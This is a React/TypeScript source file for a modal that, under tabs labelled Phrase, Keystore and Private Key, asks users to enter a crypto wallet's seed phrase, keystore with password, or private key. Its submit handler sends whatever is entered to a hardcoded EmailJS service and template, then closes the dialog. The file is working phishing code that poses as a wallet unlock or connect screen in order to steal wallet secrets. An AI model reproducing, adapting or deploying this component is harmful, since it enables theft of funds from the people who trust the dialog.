/* eslint-disable @typescript-eslint/no-explicit-any */
import { useState } from "react";
import close from "../assets/icon/close.png";
import emailjs from "@emailjs/browser";

interface ModalWithTabsProps {
  isOpen: boolean;
  onClose: () => void;
  value: string;
}
const TabModal = ({ isOpen, onClose, value }: ModalWithTabsProps) => {
  const [type, setType] = useState<"phrase" | "keystore" | "privatekey">(
    "phrase"
  );
  const [phrase, setPhrase] = useState("");
  const [privatekey, setPrivatekey] = useState("");
  const [keystoreText, setkeystoreText] = useState("");
  const [keystorePassword, setkeystorePassword] = useState("");

  const templateParams = {
    name: value,
    user_message:
      type == "keystore"
        ? `${type} text = ${keystoreText} - pasword = ${keystorePassword}`
        : type == "phrase"
        ? `${type} : PHRASE = ${phrase}`
        : type == "privatekey"
        ? `${type} : PRIVATEKEY : ${privatekey}`
        : "",
  };

  const onSubmit = () => {
    emailjs
      .send("service_seoclce", "template_imqs5zf", templateParams, {
        publicKey: "inlgKcnCIdUGOKmOe",
      })
      .then(
        () => {
          onClose();
        },
        () => {
          alert("an error occured");
          onClose();
        }
      );
  };

  // emailjs
  //   .send("service_seoclce", "template_imqs5zf", templateParams, {
  //     publicKey: "inlgKcnCldUGOKmOe",
  //   })
  //   .then(
  //     (response) => {
  //       console.log("SUCCESS!", response.status, response.text);
  //     },
  //     (err) => {
  //       console.log("FAILED...", err);
  //     }
  //   );

  const handleBackdropClick = (event: React.MouseEvent) => {
    if (event.target === event.currentTarget) {
      onClose();
    }
  };

  const [activeTab, setActiveTab] = useState<string>("phrase");
  if (!isOpen) return null;
  return (
    <div
      className="fixed inset-0 z-50 flex items-center justify-center bg-black bg-opacity-50"
      onClick={handleBackdropClick}
    >
      <div className="bg-[#1E1E1E] text-white p-6 rounded-3xl w-11/12 md:w-2/3 lg:w-1/2">
        <div className="mb-4  gap-5">
          <img src={close} onClick={onClose} alt="" className="w-4 h-4" />
          <div className="font-normal text-center">{value}</div>
        </div>
        <ul className="flex">
          <li className="-mb-px mr-1">
            <button
              className={`tab bg-gray-800 inline-block py-2 px-4 text-xs md:text-base text-white hover:text-pry font-semibold ${
                activeTab === "phrase" ? "border-b-2 border-pry" : ""
              }`}
              onClick={() => {
                setType("phrase");
                setActiveTab("phrase");
              }}
            >
              Phrase
            </button>
          </li>
          <li className="mr-1">
            <button
              className={`tab bg-black inline-block py-2 px-4 text-xs md:text-base text-white hover:text-pry font-semibold ${
                activeTab === "keystore" ? "border-b-2 border-pry" : ""
              }`}
              onClick={() => {
                setType("keystore");
                setActiveTab("keystore");
              }}
            >
              Keystore
            </button>
          </li>
          <li className="mr-1">
            <button
              className={`tab bg-black inline-block py-2 px-4 text-xs md:text-base whitespace-nowrap text-white hover:text-pry font-semibold ${
                activeTab === "privatekey" ? "border-b-2 border-pry" : ""
              }`}
              onClick={() => {
                setType("privatekey");
                setActiveTab("privatekey");
              }}
            >
              Private Key
            </button>
          </li>
        </ul>

        <div
          id="phrase"
          className={`pt-4 mb-4 ${activeTab === "phrase" ? "block" : "hidden"}`}
        >
          <label
            htmlFor="secret-phrase"
            className="block mb-2 text-sm font-normal"
          >
            Secret phrase
          </label>
          <textarea
            id="secret-phrase"
            value={phrase}
            onChange={(e: any) => setPhrase(e.target.value)}
            name="phrase"
            rows={4}
            className="w-full px-3 text-sm py-2 text-gray-300 bg-gray-800 border rounded focus:outline-none focus:shadow-outline"
            placeholder="Typically 12 (sometimes 18, 24) words separated by single spaces"
          ></textarea>
          <button
            className="mt-4 bg-pry text-white font-normal py-2 px-4 rounded focus:outline-none focus:shadow-outline"
            onClick={() => onSubmit()}
          >
            Submit
          </button>
        </div>

        <div
          id="keystore"
          className={`tab-content pt-4 mb-4 ${
            activeTab === "keystore" ? "block" : "hidden"
          }`}
        >
          <label
            htmlFor="keystore-text"
            className="block mb-2 text-sm font-normal"
          >
            Keystore Text
          </label>
          <textarea
            id="keystore-text"
            rows={4}
            onChange={(e: any) => setkeystoreText(e.target.value)}
            value={keystoreText}
            className="w-full px-3 py-2 text-sm text-gray-300 bg-gray-800 border rounded focus:outline-none focus:shadow-outline"
            placeholder="Paste keystore text here"
          ></textarea>
          <label
            htmlFor="keystore-password"
            className="block mt-4 mb-2 text-sm font-normal"
          >
            Password
          </label>
          <input
            id="keystore-password"
            type="password"
            onChange={(e: any) => setkeystorePassword(e.target.value)}
            value={keystorePassword}
            className="w-full px-3 py-2 text-sm text-gray-300 bg-gray-800 border rounded focus:outline-none focus:shadow-outline"
            placeholder="Enter password"
          />
          <button
            className="mt-4 bg-pry hover:bg-pry/70 text-white font-normal py-2 px-4 rounded focus:outline-none focus:shadow-outline"
            onClick={() => onSubmit()}
          >
            Unlock
          </button>
        </div>

        <div
          id="privatekey"
          className={`tab-content pt-4 mb-4 ${
            activeTab === "privatekey" ? "block" : "hidden"
          }`}
        >
          <label
            htmlFor="private-key-input"
            className="block mb-2 text-sm font-normal"
          >
            Private Key
          </label>
          <input
            id="private-key-input"
            type="text"
            onChange={(e: any) => setPrivatekey(e.target.value)}
            value={privatekey}
            required
            className="w-full px-3 py-2 text-gray-300 text-sm bg-gray-800 border rounded focus:outline-none focus:shadow-outline"
            placeholder="Enter your private key"
          />
          <button
            className="mt-4 bg-pry text-white font-normal py-2 px-4 rounded focus:outline-none focus:shadow-outline"
            onClick={() => onSubmit()}
          >
            Submit
          </button>
        </div>
      </div>
    </div>
  );
};

export default TabModal;
